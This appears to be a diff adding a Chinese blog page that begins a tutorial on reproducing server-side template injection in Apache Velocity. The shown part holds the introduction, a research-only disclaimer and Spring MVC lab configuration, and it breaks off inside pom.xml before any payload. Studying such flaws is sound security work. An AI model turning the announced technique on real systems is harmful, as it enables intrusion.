@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="velocity的SSTI复现与分析前言前面我们分析过了Thymeleaf的模板注入，我们今天继续来看另外一个模板注入。 Apache Velocity是一个基于Java的Web页面模版引擎，够帮我们实现页面静态化，同时它将Java代码与网页分开，并为Java Server Pages（JSP）提供了可行的替代方案。下面我们就从零开始学习复现Velocity模板注入，触发的方法主要是两种，分别使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="velocity的SSTI复现与分析">
+<meta property="og:url" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="velocity的SSTI复现与分析前言前面我们分析过了Thymeleaf的模板注入，我们今天继续来看另外一个模板注入。 Apache Velocity是一个基于Java的Web页面模版引擎，够帮我们实现页面静态化，同时它将Java代码与网页分开，并为Java Server Pages（JSP）提供了可行的替代方案。下面我们就从零开始学习复现Velocity模板注入，触发的方法主要是两种，分别使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/cHG96YcL0fg2T5GA6ep_hnGOC6FT7NwZzzYYF7FJIqg.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Mk0RfqkE1_8djqCltrDnT5ZwEJpRaGFeUvDJyOdlU3o.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/-AZ7UitZD6Nv84pI9gzw7caldSmlH3Zd80ySeXDEIdk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/drE0opZbun1nheG2qrLoD3gM1OlefU4yffK4mjoFMEM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/R6EH2eLX9EkBK8ciXUvBDHqx6WEYF4ccqz9f1i1unmQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/FXDvMw-mZbFKkJWy2WeQxLuvD_MnxY5szaLGd5tY71A.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/OTTrkwaD48kmWMeLr0eWwk-czU0HNp-cfJI_aC8yzQM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/GEzXUDp1CKnts7uiCddd7xC_F3jowMmURa2EGbhSnHs.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/UGMcgk69DSeynfPc6YWa5jdgi7DD3Ien02rrvHwHIZU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Sz0JaLsEbm3rHrBO7prHwhKmajlCTrr8GtLim-n9zns.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/cx6U8Dy33SZ83zMkgy0RsbRxvAdG7SE2UCCdSD41DiM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2rmWK-yuQD5cNSkFKD1bB8tNjQdUs36-LlqVe2N-oCY.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/gqHxkuWfjGAmXS_7sZ40jgETA1al3QAwPHopOAOXxlk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/QGSEIAGjGerH-YO291vvHX5DqtdFE709g359lPuCM8o.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/AlCh1405RmIsFuw0LhyvhXbiWXaQO1KO5oxHnNzjjYE.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/6gHMHG98hAQ6hRAKpP-0COCLICmlK0FcRITxbFCFle0.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/mcr9pym-U7v_SjkGkg7YrfFDL9fE_h8Di3CobRzLmD4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/lxJHRmZLBd0hlYOZ5e9qgw_VRUUHll3bCjkxUlVpV2s.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/PYVKv7Unio_BKPIkrsOT9Jyztnwo_5vcvASGjUjbbIU.png">
+<meta property="article:published_time" content="2023-07-03T12:46:49.000Z">
+<meta property="article:modified_time" content="2023-07-03T10:58:10.632Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="模板注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/cHG96YcL0fg2T5GA6ep_hnGOC6FT7NwZzzYYF7FJIqg.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>velocity的SSTI复现与分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/06/28/%E7%BC%96%E5%86%99%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96Bugcrowd%E7%9A%84%E6%B5%8B%E8%AF%95%E7%9B%AE%E6%A0%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&text=velocity的SSTI复现与分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&is_video=false&description=velocity的SSTI复现与分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=velocity的SSTI复现与分析&body=Check out this article: https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=velocity的SSTI复现与分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&name=velocity的SSTI复现与分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&t=velocity的SSTI复现与分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#velocity%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">velocity的SSTI复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">常用语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#evaluate%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.1.</span> <span class="toc-text">evaluate触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#merge%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.2.</span> <span class="toc-text">merge触发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%A4%BA%E7%9A%84payload"><span class="toc-number">1.5.</span> <span class="toc-text">有回显示的payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        velocity的SSTI复现与分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-03T12:46:49.000Z" class="dt-published" itemprop="datePublished">2023-07-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="velocity的SSTI复现与分析"><a href="#velocity的SSTI复现与分析" class="headerlink" title="velocity的SSTI复现与分析"></a>velocity的SSTI复现与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面我们分析过了Thymeleaf的模板注入，我们今天继续来看另外一个模板注入。</p>
+<p>Apache Velocity是一个基于Java的Web页面模版引擎，够帮我们实现页面静态化，同时它将Java代码与网页分开，并为Java Server Pages（JSP）提供了可行的替代方案。下面我们就从零开始学习复现Velocity模板注入，触发的方法主要是两种，分别使用了evaluate和merge；使用的是Spring MVC框架来整合的Velocity模板。Velocity模板也算是比较老了，目前已经逐渐被取代。</p>
+<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>velocity官网：<a target="_blank" rel="noopener" href="https://velocity.apache.org/">https://velocity.apache.org/</a></p>
+<p>注意⚠️：</p>
+<ul>
+<li>Spring4.3之后不再直接支持velocity</li>
+<li>Spring Boot 在 2.4 版本之后不再直接支持 Velocity 模板引擎</li>
+</ul>
+<p>所以需要使用springmvc或者springboot框架来构建复现的时候需要注意版本号；这里我使用的spirngmvc来进行复现。</p>
+<p><img src="cHG96YcL0fg2T5GA6ep_hnGOC6FT7NwZzzYYF7FJIqg.png" alt="image"></p>
+<p>创建完毕之后，自行添加Java目录和resources目录。</p>
+<p>在resources目录里面创建；springmvc.xml文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">           http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 启用注解驱动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 其他配置，如扫描Controller包、静态资源等 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.garck3h&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置Velocity视图解析器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;velocityConfig&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.velocity.VelocityConfigurer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;resourceLoaderPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/views/&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.velocity.VelocityViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cache&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.vm&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在web.xml里面配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>完整的pom.xml如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Velocity_SSTI<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Velocity_SSTI Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- FIXME change it to the project&#x27;s website --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.example.com<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring MVC依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.5.RELEASE<span class="tag">&lt;/<span 